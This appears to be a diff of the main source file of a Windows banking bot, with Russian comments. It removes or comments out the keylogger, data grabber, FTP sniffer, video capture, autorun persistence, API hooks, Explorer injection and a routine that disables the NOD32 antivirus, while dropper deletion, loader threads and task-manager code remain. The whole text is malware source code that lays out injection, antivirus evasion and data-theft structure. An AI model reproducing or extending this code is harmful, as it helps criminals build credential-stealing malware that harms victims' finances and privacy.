@@ -1,7 +1,6 @@
 #include <windows.h>
 
 #include "BotCore.h"
-#include "DllLoader.h"
 
 #include "Utils.h"
 #include "Exploit.h"
@@ -12,19 +11,16 @@
 #include "Loader.h"
 #include "Config.h"
 #include "Crypt.h"
-#include "FtpSniffer.h"
 #include "ntdll.h"
-#include "BotEvents.h"
 #include "Task.h"
 #include "md5.h"
 #include "BotDef.h"
-#include "DbgRpt.h"
 #include "Modules.h"
 #include "StrConsts.h"
 
 
 
-#include "BotDebug.h"
+//#include "BotDebug.h"
 
 //********************** Отладочные шаблоны **********************************
 
@@ -38,28 +34,6 @@ namespace MAINDBGTEMPLATES
 
 
 //***************************************************************************
-
-
-
-
-/*char* LogName = "c:\\BotLog.log";
-
-void WriteLog(const char* Msg)
-{
-	HANDLE H = (HANDLE)pCreateFileA(LogName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0,NULL);
-	pSetFilePointer(H, 0, 0, FILE_END);
-	DWORD W;
-	string L;
-	L.Format("[%d] %s \r\n", (DWORD)pGetTickCount() / 1000, Msg);
-	pWriteFile(H, L.t_str(), L.Length(), &W, NULL);
-
-//	pWriteFile(H, Msg, strlen(Msg), &W, NULL);
-//	pWriteFile(H, "\r\n", 2, &W, NULL);
-	pCloseHandle(H);
-}
-*/
-
-
 
 
 
@@ -132,46 +106,13 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 
 	//UnhookDlls();
 
-	BOT::Protect(NULL);
+	// BOT::Protect(NULL);
 
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
 
-	// Инициализируем систему отправки статистической информации
-	DebugReportInit();
-
-	// Вызываем событие
-	bool Cancel = false;
-	SVChostStart(NULL, Cancel);
-	if (Cancel)
-	{
-		// Убиваем процесс svchost
-		pExitProcess(1);
-	}
-
-	// Запускаем автообновление
-	#ifdef BotAutoUpdateH
-		StartAutoUpdate();
-	#endif
-
-	// Стартуем поток отправки данных
-
-	DataGrabber::StartDataSender();
-
-	// Стартуем поток обновления списка процессов кейлогера
-	#ifdef UniversalKeyLoggerH
-		KeyLogger::StartProcessListDownloader();
-	#endif
-
 
 	bool FirstSended = false;
-
-	#ifdef VideoRecorderH
-		if( VideoProcess::Start() )
-			MDBG( "Main", "Запустили видео процесс" );
-		else
-			MDBG( "Main", "ERROR: не запустился видео процесс" ); 
-	#endif
 
 	if (InitializeTaskManager(NULL, true))
 	{
@@ -201,49 +142,19 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	return 0;
 }
 
-/*
-static DWORD WINAPI NOD32Dll(void*)
-{
-	BOT::InitializeApi();
-	MDBG( "Main", "NOD32Dll()" );
-	DWORD dllSize;
-	BYTE* dll = File::ReadToBufferA( "c:\\1.dll", dllSize );
-	if( dll )
-	{
-	MDBG( "Main", "NOD32Dll() 1" );
-		MemoryLoadLibrary(dll);
-	MDBG( "Main", "NOD32Dll() 2" );
-		MemFree(dll);
-	}
-	return 0;
-}
-*/
 
 void ExplorerMain()
 {
 	BOT::Initialize();
 
-	MDBG("Main", "----------------- ExplorerMain -----------------");
-	MDBG("Main", "Appliation (PID:%d) %s", Bot->PID(), Bot->ApplicationName().t_str());
-	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPathInSysDrive() ,BOT::GetWorkFolderHash());
-
 	// Создаем мьютекс запущенного бота для сигнализации другим 
 	// способам автозапуска.
-	BOT::TryCreateBotInstance();
+	//BOT::TryCreateBotInstance();
 
-	if ( !dwExplorerSelf )
-		UnhookDlls();
+//	if ( !dwExplorerSelf )
+//		UnhookDlls();
 
-	// Отключаем отображение ошибок при крахе процесса
-	//DisableShowFatalErrorDialog();
-
-	MDBG( "Main", "Отключаем NOD32" );
-//	OffNOD32();
-//	DWORD dwPid = GetProcessIdByName("ekrn.exe");
-//	MDBG( "Main", "NOD32Dll() pid %d", dwPid );
-//	InjectIntoProcess2( dwPid, NOD32Dll );
-
-	InternalAddToAutorun();
+//	InternalAddToAutorun();
 
 	DeleteDropper();
 
@@ -253,24 +164,12 @@ void ExplorerMain()
 	if ( !dwAlreadyRun )
 		MegaJump( LoaderRoutine );
 	
-	#ifdef GrabberH
-		if ( dwFirst && !dwGrabberRun )
-			MegaJump( GrabberThread ); 
-	#endif
-
 	//MegaJump(AvFuckThread);
 	
 	// 
-	HookZwResumeThread();
-	HookZwQueryDirectoryFile();
+//	HookZwResumeThread();
+//	HookZwQueryDirectoryFile();
 
-
-	// Вызываем событие cтарта експлорера
-
-	if (dwFirst)
-		ExplorerFirstStart(NULL);
-
-	ExplorerStart(NULL);
 	// Входим в бесконечный цикл работы 
 	while (1) pSleep(INFINITE);
 }
@@ -281,7 +180,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 
 	BOT::Initialize();
 
-	UnhookDlls();
+//	UnhookDlls();
 
 	
 	if (dwExplorerSelf) 
@@ -306,39 +205,16 @@ int APIENTRY MyMain()
 
 	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
 	
-#ifdef INSTALL_BOT_AS_SERVICE
-	// Проверяем сервис запущен или нет
-	if (BOT::IsService())
-	{
-		MDBG("Main", "Стартует сервис");
-		MDBG("Main", "Рабочий каталог %s", BOT::GetBotPath().t_str());
-		// Если бот ещё не  запущен, то выполняем инжект в эксплорер
-		BOT::SetBotType(BotService);
-
-		if (!BOT::IsRunning())
-		{
-			//JmpToExplorer(ExplorerRoutine);
-			MDBG("Main", "Сервис инжектится в Explorer");
-			dwExplorerSelf = 1;
-			JmpToExplorer(ExplorerRoutine);
-		}
-
-		BOT::ExecuteService();
-		pExitProcess(0);
-		return 0;
-	}
-#endif
-
 	MDBG("Main", "Звпускается Ring3 версия бота");
 	// Запускается ринг3 версия
 	BOT::SetBotType(BotRing3);
 
 	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
-	if (BOT::IsRunning())
+	/*if (BOT::IsRunning())
 	{
 		pExitProcess(0);
 		return 0;
-	}
+	}*/
 
 	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);
 
